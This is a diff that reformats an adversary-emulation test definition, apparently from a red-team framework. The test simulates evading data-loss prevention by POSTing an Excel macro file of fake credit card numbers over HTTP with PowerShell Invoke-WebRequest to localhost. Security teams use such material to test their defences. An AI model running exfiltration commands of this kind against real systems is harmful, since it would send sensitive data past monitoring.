@@ -1,16 +1,18 @@
-- id: d89e1756-4ec2-56b3-81cd-d9d261c479f9
+- requirements: []
   name: Soumaia ART Tests - DLP Evasion via Sensitive Data in VBA Macro over HTTP
   description: 'Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.
 
     Sensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.'
   tactic: stealth
-  technique:
-    attack_id: T1027
-    name: Obfuscated Files or Information
-  platforms:
-    windows:
-      psh:
-        command: |-
-          Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body ".\T1027-cc-macro.xlsm"
-        payloads:
-        - T1027-cc-macro.xlsm
+  technique_id: T1027
+  technique_name: Obfuscated Files or Information
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads:
+    - T1027-cc-macro.xlsm
+    parsers: []
+    command: Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body ".\T1027-cc-macro.xlsm"
+  id: d89e1756-4ec2-56b3-81cd-d9d261c479f9
